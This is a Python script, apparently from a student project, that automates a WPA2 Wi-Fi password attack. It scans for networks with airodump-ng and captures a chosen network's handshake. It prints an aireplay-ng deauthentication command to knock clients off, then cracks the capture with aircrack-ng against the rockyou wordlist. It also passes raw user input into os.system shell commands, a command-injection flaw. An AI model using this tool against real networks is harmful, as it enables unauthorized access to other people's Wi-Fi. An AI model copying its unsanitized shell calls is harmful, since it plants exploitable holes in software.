import os
import subprocess

def wpa_capture_password_cracking():
    """
    Perform WPA2 handshake capture for password cracking
    """
    print("---------------------------------------------------------------------")
    print("Select option for password cracking\n\n")
    print("1. Crack password using already existing capture file")
    print("2. Capture WPA handshake and then crack network password")
    print("---------------------------------------------------------------------")

    option = int(input())

    match option:
        case 1:
            os.chdir("..")
            capture_file = input("Enter the name of the .cap capture file: ")
            os.system("aircrack-ng -a2 -w /home/khushboo/Documents/GitHub/FYP/wordlists/rockyou.txt " + capture_file)

        case 2:
            try:
                os.system("airodump-ng --band abg wlan0mon")

                package_name = input("Name of directory to save the package: ")
                passed_bssid = input("Enter the passed_bssid of any network to be sniffed: ")
                channel = input("Enter the channel this network is working on: ")
                os.system("mkdir SniffedNetworkData/" + package_name)

                capFile_name = input("Enter the name to be assigned to the wireshark capture file: ")

                command1 = f"airodump-ng -w SniffedNetworkData/{package_name}/{capFile_name} -c {channel} --bssid {passed_bssid} wlan0mon"
                print("---------------------------------------------------------------------")
                print("Use this command in a different terminal in privelege mode:\naireplay-ng -0 10 -a " + passed_bssid +" wlan0mon")
                print("---------------------------------------------------------------------")
                os.system(command1)

                sniffed_capture_file = input("Paste the generated .cap file:\t")

                os.system("aircrack-ng -a2 -w /home/khushboo/Documents/GitHub/FYP/wordlists/rockyou.txt " + sniffed_capture_file)
            except Exception as e:
                print(f"Error performing WPA2 handshake: {e}")
        case _:
            print("Invalid option")
